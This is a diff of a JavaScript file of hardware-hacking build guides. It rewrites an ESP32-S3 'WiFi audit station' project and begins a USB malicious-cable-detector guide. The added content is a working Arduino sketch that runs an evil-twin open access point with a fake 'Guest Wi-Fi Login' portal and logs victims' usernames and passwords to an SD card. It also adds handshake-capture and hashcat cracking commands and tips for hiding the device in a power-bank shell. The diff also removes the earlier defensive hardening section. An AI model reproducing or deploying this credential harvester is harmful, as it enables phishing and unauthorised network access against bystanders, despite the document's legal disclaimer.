@@ -837,785 +837,451 @@ window.SignalGuides = {
             }
         ]
     },
-
     // ========================================================================
     // SG-38: Portable WiFi Audit Station
+    // ESP32-S3 + 1.8" TFT + MicroSD + LiPo — WiFi Pineapple equivalent
     // ========================================================================
     'sg-38': {
-        intro: '<p>A WiFi audit station is a self-contained wireless security testing platform. The commercial gold standard is the <strong>Hak5 WiFi Pineapple</strong> ($100-400), which combines rogue AP creation, client deauthentication, handshake capture, evil twin attacks, and probe request sniffing in one device.</p>' +
-               '<p>We build a more capable version using an <strong>ESP32-S3</strong> with a <strong>TFT display</strong>, <strong>SD card storage</strong>, and optional <strong>GPS module</strong>. The ESP32-S3 has two CPU cores (one for packet capture, one for the UI/web server) and supports both 2.4GHz WiFi and Bluetooth.</p>' +
-               '<p>This is the most advanced wireless project in the series. It combines the scanning from SG-35 with handshake capture, WPS exploitation testing, and a professional touchscreen interface.</p>' +
-               '<p><strong>Hardware needed:</strong> ESP32-S3 DevKit, 1.8" TFT display (ST7735 SPI), MicroSD breakout, SD card, 3 buttons, optional GPS module, breadboard, jumper wires. Total cost: ~$20.</p>',
 
-        wiringSvg: '<div class="svg-build-wrap">' +
-            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
-            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
-            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
-            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
-            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">WIFI AUDIT STATION &mdash; COMPONENT LAYOUT</text>' +
-            '<!-- ESP32-S3 center -->' +
-            '<rect x="260" y="50" width="200" height="90" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
-            '<text x="360" y="75" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">ESP32-S3 DevKit</text>' +
-            '<text x="360" y="95" text-anchor="middle" fill="#8b949e" font-size="8">Dual-core 240MHz + WiFi/BT</text>' +
-            '<text x="360" y="110" text-anchor="middle" fill="#8b949e" font-size="8">Promiscuous mode + AP mode</text>' +
-            '<!-- TFT Display -->' +
-            '<rect x="40" y="160" width="150" height="70" rx="6" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
-            '<text x="115" y="185" text-anchor="middle" fill="#a855f7" font-size="9" font-weight="600">1.8" TFT Display</text>' +
-            '<text x="115" y="200" text-anchor="middle" fill="#8b949e" font-size="7">ST7735 SPI, 160x128</text>' +
-            '<text x="115" y="215" text-anchor="middle" fill="#555" font-size="7">Network list + status</text>' +
-            '<!-- SD -->' +
-            '<rect x="220" y="160" width="130" height="70" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
-            '<text x="285" y="185" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD</text>' +
-            '<text x="285" y="200" text-anchor="middle" fill="#8b949e" font-size="7">PCAP + handshakes</text>' +
-            '<text x="285" y="215" text-anchor="middle" fill="#555" font-size="7">Wireshark format</text>' +
-            '<!-- Buttons -->' +
-            '<rect x="375" y="160" width="130" height="70" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
-            '<text x="440" y="185" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">3 Buttons</text>' +
-            '<text x="440" y="200" text-anchor="middle" fill="#8b949e" font-size="7">UP / DOWN / SELECT</text>' +
-            '<text x="440" y="215" text-anchor="middle" fill="#555" font-size="7">Menu navigation</text>' +
-            '<!-- GPS -->' +
-            '<rect x="530" y="160" width="150" height="70" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="0.5"/>' +
-            '<text x="605" y="185" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">GPS (Optional)</text>' +
-            '<text x="605" y="200" text-anchor="middle" fill="#8b949e" font-size="7">NEO-6M module</text>' +
-            '<text x="605" y="215" text-anchor="middle" fill="#555" font-size="7">Wardriving coords</text>' +
-            '<!-- Lines -->' +
-            '<line x1="300" y1="140" x2="115" y2="160" stroke="#a855f7" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<line x1="340" y1="140" x2="285" y2="160" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<line x1="400" y1="140" x2="440" y2="160" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<line x1="440" y1="140" x2="605" y2="160" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '</svg>' +
-            '</div>',
+        intro: '<p>The SG-38 is a self-contained, battery-powered WiFi audit station built around the ESP32-S3 microcontroller. It replicates the core capabilities of the Hak5 WiFi Pineapple at roughly 5% of the cost: evil twin access point creation, captive portal credential harvesting, WPA2 handshake capture to SD card, and a full TFT menu system for field operation.</p>' +
+               '<p>At its core, the ESP32-S3 runs a dual-role WiFi stack &mdash; one radio scans for nearby networks and targets, the other broadcasts a spoofed AP. A 1.8" SPI TFT display driven by the ST7735 controller provides the menu interface. A MicroSD module logs handshakes, portal credentials, and probe requests as flat files. A TP4056-based LiPo charger circuit provides 3.7V battery operation with USB-C charging.</p>' +
+               '<p><strong>Legal requirement:</strong> This device transmits 802.11 RF signals. Operation is restricted to networks you own or have explicit written authorization to test. Using this device against networks without authorization violates the Computer Fraud and Abuse Act (18 U.S.C. &sect; 1030), the Electronic Communications Privacy Act, and equivalent statutes internationally.</p>' +
+               '<p><strong>Software options:</strong> Option A is <a href="https://github.com/justcallmekoko/ESP32Marauder" style="color:#ff6b35">ESP32 Marauder</a> (pre-built, feature-complete). Option B is the custom Arduino sketch written from scratch in this guide &mdash; the preferred path for learning the underlying mechanics.</p>',
 
-        wiring: '    WIRING DIAGRAM\n' +
-                '\n' +
-                '    ESP32-S3              TFT ST7735 (SPI)\n' +
-                '    GPIO11 (MOSI) ------> SDA\n' +
-                '    GPIO12 (SCK)  ------> SCK\n' +
-                '    GPIO10 (CS)   ------> CS\n' +
-                '    GPIO9  (DC)   ------> DC\n' +
-                '    GPIO8  (RST)  ------> RES\n' +
-                '    3V3           ------> VCC\n' +
-                '    GND           ------> GND\n' +
-                '\n' +
-                '    ESP32-S3              MicroSD (SPI)\n' +
-                '    GPIO11 (MOSI) ------> MOSI  (shared)\n' +
-                '    GPIO13 (MISO) ------> MISO\n' +
-                '    GPIO12 (SCK)  ------> SCK   (shared)\n' +
-                '    GPIO7  (CS)   ------> CS\n' +
-                '    3V3           ------> VCC\n' +
-                '    GND           ------> GND\n' +
-                '\n' +
-                '    Buttons (to GND, internal pull-up):\n' +
-                '    GPIO4 = UP    GPIO5 = DOWN    GPIO6 = SELECT\n' +
-                '\n' +
-                '    GPS NEO-6M (UART, optional):\n' +
-                '    GPIO17 (TX) --> RX    GPIO16 (RX) --> TX\n' +
-                '    3V3 --> VCC           GND --> GND',
+        wiring: [
+            'SG-38 Pin Connections &mdash; ESP32-S3 + ST7735 TFT + MicroSD + TP4056',
+            '&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;',
+            '',
+            '1.8" TFT Display (ST7735 / SPI)',
+            'TFT Pin       ESP32-S3 GPIO   Notes',
+            'VCC           3.3V            Do NOT connect to 5V',
+            'GND           GND',
+            'CS            GPIO5           Chip Select (active LOW)',
+            'RESET         GPIO17          Pull HIGH to run',
+            'DC / RS       GPIO16          Data/Command select',
+            'SDA / MOSI    GPIO23          SPI data out',
+            'SCK / CLK     GPIO18          SPI clock',
+            'LED / BLK     3.3V            Backlight always on',
+            '',
+            'MicroSD Module (SPI shared bus with TFT, separate CS)',
+            'SD Pin        ESP32-S3 GPIO   Notes',
+            'VCC           3.3V',
+            'GND           GND',
+            'CS            GPIO4           Separate CS from TFT',
+            'MOSI          GPIO23          Shared SPI bus',
+            'SCK           GPIO18          Shared SPI bus',
+            'MISO          GPIO19          Shared SPI bus',
+            '',
+            'TP4056 LiPo Charger Module',
+            'TP4056 Pin    Connection      Notes',
+            'USB-C / IN+   USB power       Charging input',
+            'IN-           USB GND',
+            'BAT+ / OUT+   LiPo (+)        3.7V battery positive',
+            'BAT- / OUT-   LiPo (-)        Battery negative',
+            'OUT+          ESP32 VIN/5V    Or use boost converter',
+            '',
+            'SPI Bus Summary: SCK=18, MOSI=23, MISO=19 | TFT_CS=5 | SD_CS=4',
+            'WARNING: Both TFT and SD share the SPI bus. Always deassert one',
+            'CS before asserting the other. Never pull both CS LOW simultaneously.',
+        ].join('\n'),
 
-        wiringNotes: '<p><strong>ESP32-S3 vs ESP32:</strong> The S3 variant has native USB, more GPIO pins, and better WiFi performance. It also supports USB-OTG, which means it can act as a USB host &mdash; useful for future expansion (connecting WiFi adapters for more channels).</p>' +
-                     '<p><strong>GPS for wardriving:</strong> The NEO-6M GPS module adds location tagging to captured networks. Combined with a car charger and a suction-cup mount, this becomes a full wardriving rig. GPS coordinates are stored alongside PCAP data for mapping in tools like WiGLE.</p>',
+        wiringNotes: '<p><strong>Power note:</strong> The ESP32-S3 draws up to 240mA during active WiFi transmission. Use a LiPo cell of at least 1000mAh for meaningful field runtime. A 2000mAh cell gives approximately 4-5 hours of continuous operation. Use the TP4056 module version that includes the DW01A protection IC (4-pin module with battery protection) &mdash; the version without protection will damage your battery through overdischarge.</p>',
 
         steps: [
             {
-                title: 'Flash the Marauder Firmware',
-                content: '<p>Rather than writing a WiFi audit tool from scratch, we use the open-source <strong>ESP32 Marauder</strong> firmware by JustCallMeKoko. It provides a complete WiFi/Bluetooth offensive toolkit with a polished GUI for TFT displays.</p>' +
-                         '<p>Marauder capabilities include:</p>' +
-                         '<ul>' +
-                         '<li>WiFi scanning (AP and client enumeration)</li>' +
-                         '<li>Deauthentication attacks</li>' +
-                         '<li>Beacon spam (fake SSID flooding)</li>' +
-                         '<li>Probe request sniffing</li>' +
-                         '<li>PMKID/EAPOL handshake capture</li>' +
-                         '<li>Evil portal (captive portal phishing)</li>' +
-                         '<li>Bluetooth scanning and enumeration</li>' +
-                         '<li>Packet capture to SD (PCAP format)</li>' +
-                         '</ul>',
-                code: '# Flash Marauder via the web flasher (easiest method):\n# 1. Visit: https://github.com/justcallmekoko/ESP32Marauder\n# 2. Download the latest release for your ESP32-S3 board\n# 3. Flash using esptool:\n\npip install esptool\n\n# Erase flash first\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 erase_flash\n\n# Flash the firmware\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 \\\n  --baud 921600 write_flash \\\n  0x0 ESP32Marauder_esp32s3.bin\n\n# Or use the Arduino IDE:\n# 1. Clone the Marauder repo\n# 2. Open esp32_marauder.ino\n# 3. Select ESP32-S3 Dev Module\n# 4. Set PSRAM: OPI, Flash: QIO 80MHz\n# 5. Upload',
-                language: 'Bash',
-                tip: '<strong>Tip:</strong> If you have a cheap ESP32 board (not S3), Marauder still works but with reduced features. Check the Marauder wiki for your specific board\'s compatibility matrix.'
+                title: 'Install ESP32 Board Support in Arduino IDE',
+                content: '<p>Open Arduino IDE 2.x. Go to <strong>File &rarr; Preferences</strong> and add this URL to "Additional boards manager URLs":</p>' +
+                         '<pre style="background:#0d1117;padding:8px;border-radius:4px;color:#8b949e;font-size:0.85rem">https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json</pre>' +
+                         '<p>Then go to <strong>Tools &rarr; Board &rarr; Boards Manager</strong>, search "esp32", and install the Espressif Systems package version 2.0.14 or later. After install, select <strong>Board: "ESP32S3 Dev Module"</strong>.</p>',
+                tip: 'Upload settings: Board=ESP32S3 Dev Module, Flash Size=4MB, Partition Scheme=Default 4MB with spiffs, Upload Speed=921600. If upload fails, hold the BOOT button while clicking Upload, then release after the "Connecting..." dots appear in the console.'
             },
             {
-                title: 'Configure the Display and Buttons',
-                content: '<p>Marauder auto-detects common display configurations. If your display does not work out of the box, you may need to adjust the pin definitions in the source code before compiling.</p>' +
-                         '<p>The three-button navigation works as follows:</p>' +
-                         '<ul>' +
-                         '<li><strong>UP:</strong> Move up in menus / scroll up in scan results</li>' +
-                         '<li><strong>DOWN:</strong> Move down in menus / scroll down</li>' +
-                         '<li><strong>SELECT:</strong> Choose the highlighted option / start action</li>' +
-                         '</ul>',
-                code: '// In the Marauder source, adjust these if your pins differ:\n// File: configs/MarauderConfig.h\n\n#define TFT_MOSI 11\n#define TFT_SCLK 12\n#define TFT_CS   10\n#define TFT_DC   9\n#define TFT_RST  8\n\n#define SD_CS    7\n\n#define BTN_UP   4\n#define BTN_DOWN 5\n#define BTN_SEL  6\n\n// GPS (optional)\n#define GPS_TX   17\n#define GPS_RX   16\n#define GPS_BAUD 9600',
-                language: 'C++',
-                tip: '<strong>Tip:</strong> If the display shows colors inverted or rotated, change <code>TFT_ROTATION</code> in the config. Common values: 0, 1, 2, 3 (each rotates 90 degrees).'
+                title: 'Install Required Libraries',
+                content: '<p>In Arduino IDE, open <strong>Sketch &rarr; Include Library &rarr; Manage Libraries</strong> and install:</p>' +
+                         '<ul><li><strong>Adafruit ST7735 and ST7789 Library</strong> &mdash; version 1.10.x &mdash; TFT display driver</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency</li><li><strong>SD</strong> &mdash; built-in Arduino SD library (no separate install needed)</li></ul>',
+                tip: 'If you see "Adafruit_GFX.h not found" during compile, the GFX Library was not installed. The ST7735 library lists it as a dependency but does not always pull it in automatically on ESP32 boards.'
             },
             {
-                title: 'Capture WPA Handshakes',
-                content: '<p>The most practical offensive use is capturing WPA/WPA2 handshakes for offline password cracking. The process:</p>' +
-                         '<ol>' +
-                         '<li>Scan for target APs and note the channel.</li>' +
-                         '<li>Start packet capture on the target channel.</li>' +
-                         '<li>Send deauth frames to force clients to reconnect.</li>' +
-                         '<li>The reconnection process includes the 4-way WPA handshake.</li>' +
-                         '<li>The captured PCAP file contains the handshake for cracking.</li>' +
-                         '</ol>',
-                code: '# After capturing the handshake PCAP, crack it on your laptop:\n\n# Using aircrack-ng:\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture.pcap\n\n# Using hashcat (GPU-accelerated, much faster):\n# First convert PCAP to hashcat format:\nhcxpcapngtool -o hash.hc22000 capture.pcap\n\n# Then crack:\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n\n# For PMKID attacks (no client needed):\n# Marauder can capture PMKID from AP beacons directly.\n# This does not require deauthing any clients.\nhashcat -m 22000 pmkid.hc22000 wordlist.txt',
-                language: 'Bash',
-                tip: '<strong>PMKID attack:</strong> Some APs include the PMKID in the first message of the 4-way handshake. Marauder can capture this without deauthing anyone &mdash; a completely passive attack. Not all APs are vulnerable, but many are.'
+                title: 'Flash the Captive Portal Firmware',
+                content: '<p>This sketch creates an evil twin AP, runs a captive portal HTTP server with DNS hijacking, logs captured credentials to the SD card, and displays the capture count on the TFT.</p>',
+                code: '#include <WiFi.h>\n#include <WebServer.h>\n#include <DNSServer.h>\n#include <SPI.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_ST7735.h>\n#include <SD.h>\n#include <FS.h>\n\n// Pin definitions\n#define TFT_CS   5\n#define TFT_RST  17\n#define TFT_DC   16\n#define SD_CS    4\n// MOSI=23, SCK=18, MISO=19 (hardware SPI defaults)\n\n// Evil twin config\nconst char* EVIL_SSID = "Airport_FreeWiFi";  // CHANGE THIS\nconst char* AP_PASS   = "";                   // Open AP\nconst IPAddress AP_IP(10, 10, 10, 1);\nconst IPAddress SUBNET(255, 255, 255, 0);\n\nAdafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);\nWebServer       server(80);\nDNSServer       dns;\nint             capturedCount = 0;\nbool            sdReady       = false;\n\n// Captive portal HTML\nconst char PORTAL_HTML[] PROGMEM = R"rawhtml(\n<!DOCTYPE html><html><head>\n<meta name=\'viewport\' content=\'width=device-width,initial-scale=1\'>\n<style>\nbody{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;\n     justify-content:center;align-items:center;min-height:100vh;margin:0}\n.card{background:#fff;border-radius:8px;padding:32px;max-width:360px;\n      width:90%;box-shadow:0 2px 16px rgba(0,0,0,.12)}\nh2{margin:0 0 8px;font-size:1.2rem;color:#222}\np{color:#666;font-size:.9rem;margin:0 0 20px}\ninput{width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;\n      border-radius:4px;font-size:1rem;box-sizing:border-box}\nbutton{width:100%;padding:12px;background:#0070c0;color:#fff;border:none;\n       border-radius:4px;font-size:1rem;cursor:pointer}\n</style></head><body>\n<div class=\'card\'>\n  <h2>Guest Wi-Fi Login</h2>\n  <p>Enter your credentials to access the internet.</p>\n  <form method=\'POST\' action=\'/login\'>\n    <input type=\'text\'     name=\'user\' placeholder=\'Username or Email\' required>\n    <input type=\'password\' name=\'pass\' placeholder=\'Password\'          required>\n    <button type=\'submit\'>Connect</button>\n  </form>\n</div></body></html>\n)rawhtml";\n\nvoid tftStatus(const char* line1, const char* line2 = "", uint16_t col = ST77XX_GREEN) {\n    tft.fillScreen(ST77XX_BLACK);\n    tft.setTextColor(col); tft.setTextSize(1);\n    tft.setCursor(4, 8);  tft.println(line1);\n    tft.setTextColor(ST77XX_WHITE);\n    tft.setCursor(4, 24); tft.println(line2);\n}\n\nvoid logCredential(const String& user, const String& pass) {\n    if (!sdReady) return;\n    File f = SD.open("/creds.txt", FILE_APPEND);\n    if (f) { f.printf("[%lu] user=%s pass=%s\\n", millis(), user.c_str(), pass.c_str()); f.close(); }\n}\n\nvoid handleRoot() { server.send_P(200, "text/html", PORTAL_HTML); }\n\nvoid handleLogin() {\n    String user = server.hasArg("user") ? server.arg("user") : "";\n    String pass = server.hasArg("pass") ? server.arg("pass") : "";\n    if (user.length() > 0) {\n        capturedCount++;\n        logCredential(user, pass);\n        Serial.printf("[CAPTURE] user=%s pass=%s\\n", user.c_str(), pass.c_str());\n        tft.fillRect(0, 40, 160, 20, ST77XX_BLACK);\n        tft.setTextColor(ST77XX_YELLOW); tft.setCursor(4, 44);\n        tft.print("Captured: "); tft.print(capturedCount);\n    }\n    server.sendHeader("Location", "https://www.google.com", true);\n    server.send(302, "text/plain", "");\n}\n\nvoid handleNotFound() {\n    server.sendHeader("Location", String("http://") + AP_IP.toString(), true);\n    server.send(302, "text/plain", "");\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    tft.initR(INITR_BLACKTAB); tft.setRotation(1);\n    tftStatus("SG-38 INIT", "Starting...", ST77XX_CYAN);\n    delay(800);\n\n    if (SD.begin(SD_CS)) { sdReady = true; tftStatus("SD READY", "/creds.txt active"); }\n    else { tftStatus("SD FAILED", "Logging to Serial only", ST77XX_RED); }\n    delay(600);\n\n    WiFi.mode(WIFI_AP);\n    WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);\n    WiFi.softAP(EVIL_SSID, AP_PASS);\n    dns.start(53, "*", AP_IP);\n\n    server.on("/",                 HTTP_GET,  handleRoot);\n    server.on("/login",            HTTP_POST, handleLogin);\n    server.on("/generate_204",     HTTP_GET,  handleRoot);\n    server.on("/hotspot-detect.html", HTTP_GET, handleRoot);\n    server.on("/ncsi.txt",         HTTP_GET,  handleRoot);\n    server.on("/connecttest.txt",  HTTP_GET,  handleRoot);\n    server.onNotFound(handleNotFound);\n    server.begin();\n\n    tftStatus("AP LIVE", EVIL_SSID, ST77XX_ORANGE);\n    tft.setCursor(4, 44); tft.setTextColor(ST77XX_WHITE);\n    tft.print(AP_IP.toString());\n}\n\nvoid loop() {\n    dns.processNextRequest();\n    server.handleClient();\n}',
+                language: 'Arduino (C++)',
+                tip: 'On Android and iOS, the captive portal detection fires automatically when connecting to an open AP &mdash; the portal browser opens without any user action. On Windows, the system tray shows "Additional sign-in info may be required." The six server.on() routes for /generate_204, /hotspot-detect.html, etc. are the OS-specific probe paths that trigger this behavior.'
             },
             {
-                title: 'Defense: Comprehensive WiFi Security Hardening',
-                content: '<p>This device combines every WiFi attack into one tool. Here is the comprehensive defense playbook:</p>' +
-                         '<ul>' +
-                         '<li><strong>WPA3-SAE:</strong> Upgrade to WPA3 wherever possible. SAE (Simultaneous Authentication of Equals) replaces the vulnerable 4-way handshake with a zero-knowledge proof. Captured handshakes cannot be cracked offline.</li>' +
-                         '<li><strong>Strong passwords:</strong> If stuck on WPA2, use passwords 20+ characters long with mixed case, numbers, and symbols. This makes dictionary attacks infeasible.</li>' +
-                         '<li><strong>Disable WPS:</strong> WPS (WiFi Protected Setup) has known vulnerabilities (Reaver attack). Disable it in your router settings.</li>' +
-                         '<li><strong>802.11w PMF:</strong> Prevents deauthentication attacks (see SG-35 defense section).</li>' +
-                         '<li><strong>WIDS/WIPS:</strong> Deploy wireless intrusion detection. Enterprise solutions (Cisco CleanAir, Aruba RFProtect) detect rogue APs, deauth floods, and evil twins.</li>' +
-                         '<li><strong>Client isolation + VLAN segmentation:</strong> Separate IoT, guest, and corporate traffic onto different VLANs.</li>' +
-                         '<li><strong>Rogue AP detection:</strong> Periodically scan for APs with your SSID that you did not deploy. Evil twin attacks rely on matching your SSID.</li>' +
-                         '</ul>',
-                code: null,
-                language: null,
-                tip: '<strong>Enterprise standard:</strong> A properly hardened wireless network uses WPA3-Enterprise (802.1X with RADIUS), 802.11w (PMF required), certificate-based authentication, and a WIDS. This combination defeats every attack this device can perform.'
+                title: 'Flash ESP32 Marauder for Handshake Capture',
+                content: '<p>The custom sketch above handles captive portals. For WPA2 PMKID capture and handshake sniffing, flash <a href="https://github.com/justcallmekoko/ESP32Marauder/wiki/update-firmware" style="color:#ff6b35">ESP32 Marauder</a> using esptool.py:</p>',
+                code: '# Install esptool\npip install esptool\n\n# Flash Marauder to ESP32-S3 (adjust port: /dev/ttyUSB0 Linux, COM5 Windows)\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 --baud 921600 \\\n  write_flash -z 0x0 esp32_marauder_v1.1.0_20241201_esp32s3.bin\n\n# After flashing, connect via serial at 115200 baud\n# Marauder commands:\n# stui            -- enter interactive TFT menu mode\n# scanap          -- scan for nearby access points\n# sniffpmkid      -- capture PMKID (no deauth required)\n# sniffwpa -c 6   -- capture WPA handshakes on channel 6',
+                language: 'Shell'
+            },
+            {
+                title: 'Crack Captured Handshakes with Hashcat',
+                content: '<p>Transfer PCAP files from the SD card to a Kali Linux machine and run hashcat:</p>',
+                code: '# Convert PCAP to hashcat 22000 format\nhcxpcapngtool -o capture.hc22000 handshake.pcap\n\n# Dictionary attack (WPA2/WPA3 = mode 22000)\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt\n\n# With rules for better real-world coverage\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt \\\n  -r /usr/share/hashcat/rules/best64.rule\n\n# Show cracked passwords\nhashcat -m 22000 capture.hc22000 --show',
+                language: 'Shell (Kali Linux)',
+                tip: 'A modern GPU (RTX 4070) tests approximately 1,500,000 WPA2 candidates per second. rockyou.txt has 14 million entries &mdash; a full sweep takes under 10 seconds. For corporate assessments, supplement with targeted wordlists using the organization name, city, sports teams, and common password patterns (Company2024!, etc.).'
             }
         ],
 
-        testing: '<p>Verify your WiFi audit station works:</p>' +
-                 '<ul>' +
-                 '<li><strong>Display shows menu:</strong> Power on the device. The TFT should display the Marauder menu system. Navigate with buttons to verify all three work.</li>' +
-                 '<li><strong>WiFi scan:</strong> Run a scan and verify it detects your own AP. Signal strength (RSSI) should match expectations for the distance.</li>' +
-                 '<li><strong>SD card logging:</strong> Start a capture, wait 30 seconds, stop. Pull the SD card and verify PCAP files were created.</li>' +
-                 '<li><strong>GPS (if installed):</strong> Take the device outside with a clear sky view. GPS should acquire a fix within 60 seconds. Coordinates should appear in the scan data.</li>' +
-                 '</ul>',
+        testing: '<p><strong>Verification checklist:</strong></p>' +
+                 '<ol><li>TFT displays "AP LIVE" with SSID and IP address on boot</li><li>The SSID appears in a WiFi scan on a test phone</li><li>Connecting triggers the captive portal automatically on Android (instant) and iOS (within 3 seconds)</li><li>Submitting test credentials increments the counter on the TFT and writes to <code>/creds.txt</code> on the SD card</li><li>The device runs at least 2 hours on a 1000mAh LiPo without restart</li></ol>' +
+                 '<p><strong>Common failure modes and fixes:</strong></p>' +
+                 '<ul><li>TFT shows garbage pixels: try <code>INITR_GREENTAB</code> or <code>INITR_REDTAB</code> instead of <code>INITR_BLACKTAB</code></li><li>SD fails to mount: format as FAT32 (not exFAT), card must be 32GB or smaller</li><li>Portal not auto-redirecting: verify all six captive portal probe paths are registered with server.on()</li><li>ESP32-S3 not detected by Arduino IDE: install the CP2102 USB-to-serial driver for your OS</li></ul>',
 
-        commonMistakes: [
-            {
-                title: 'Wrong ESP32 Variant',
-                description: 'ESP32, ESP32-S2, ESP32-S3, and ESP32-C3 are all different chips. Marauder firmware is chip-specific. Make sure you download the build matching your exact variant.'
-            },
-            {
-                title: 'PSRAM Not Enabled',
-                description: 'Some ESP32-S3 boards have PSRAM (extra RAM). If Marauder crashes with memory errors, enable PSRAM in Arduino IDE: Tools > PSRAM > OPI PSRAM.'
-            }
-        ]
+        troubleshooting: '<p><strong>SPI bus conflict between TFT and SD:</strong> If one works but not the other, double-check CS pins (TFT_CS=5, SD_CS=4). Add 100nF bypass capacitors on each module\'s VCC pin close to the IC. Ensure the shared MOSI/SCK jumper wires make solid contact &mdash; breadboard connections on high-frequency SPI lines are a common failure point.</p>' +
+                         '<p><strong>Clients connect but portal never appears:</strong> Modern Android 12+ and iOS 14+ detect captive portals via HTTPS probe requests which the HTTP-only server cannot answer. The user will see "Sign in to network" in the status bar but may need to tap it manually. Android also shows a notification &mdash; this is expected behavior. HTTPS captive portals require a certificate which defeats the purpose for testing.</p>',
+
+        challenges: '<p><strong>Level up:</strong></p>' +
+                    '<ul><li>Add a 5-way navigation button and implement a multi-page TFT menu: Scan Networks, Evil Twin, Probe Logger, Captive Portal Settings, View Captured Credentials</li><li>Add a passive probe request logger &mdash; capture SSIDs that nearby devices probe for (their "remembered network" lists) and display them scrolling on the TFT</li><li>Implement PMKID capture without deauth using <a href="https://github.com/risinek/esp32-wifi-penetration-tool" style="color:#ff6b35">esp32-wifi-penetration-tool</a></li><li>Build a 3D-printed enclosure that hides the device inside a power bank shell for covert deployment assessments</li></ul>'
     },
 
     // ========================================================================
     // SG-39: Malicious Cable Detector
+    // Pi Pico + CircuitPython USB descriptor analyzer
     // ========================================================================
     'sg-39': {
-        intro: '<p>Malicious USB cables look identical to normal charging cables but contain hidden electronics that can inject keystrokes, exfiltrate data, or provide remote access. The most famous example is the <strong>O.MG Cable</strong> (~$120-180), which embeds a WiFi-enabled microcontroller inside a standard USB connector.</p>' +
-               '<p>This project builds a <strong>detector</strong> &mdash; a device that identifies whether a USB cable contains hidden electronics. It works by analyzing the electrical characteristics of the cable: a normal cable has simple wire connections, while a malicious cable has additional resistance, capacitance, and data line behavior caused by the embedded electronics.</p>' +
-               '<p>We use a <strong>Raspberry Pi Pico</strong> with voltage measurement on the USB data lines (D+ and D-), current monitoring, and USB enumeration analysis. When you plug a suspect cable into the detector with a test device, it checks for anomalies that indicate embedded hardware.</p>' +
-               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico, USB-A breakout board, 2 LEDs (red/green), resistors, breadboard. Total cost: ~$4.</p>',
 
-        wiringSvg: '<div class="svg-build-wrap">' +
-            '<svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
-            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
-            '<rect width="720" height="280" fill="#0d1117" rx="8"/>' +
-            '<rect x="10" y="10" width="700" height="260" fill="url(#bg-grid)" rx="4"/>' +
-            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">MALICIOUS CABLE DETECTOR &mdash; TEST FLOW</text>' +
-            '<!-- Suspect cable -->' +
-            '<rect x="40" y="70" width="160" height="70" rx="8" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.5)" stroke-width="1.5"/>' +
-            '<text x="120" y="95" text-anchor="middle" fill="#eab308" font-size="10" font-weight="600">Suspect Cable</text>' +
-            '<text x="120" y="115" text-anchor="middle" fill="#8b949e" font-size="7">Plug into USB-A breakout</text>' +
-            '<text x="120" y="128" text-anchor="middle" fill="#555" font-size="7">Cable under test</text>' +
-            '<!-- Arrow -->' +
-            '<line x1="200" y1="105" x2="250" y2="105" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<polygon points="250,101 258,105 250,109" fill="#eab308" opacity="0.6"/>' +
-            '<!-- Pico detector -->' +
-            '<rect x="260" y="55" width="200" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
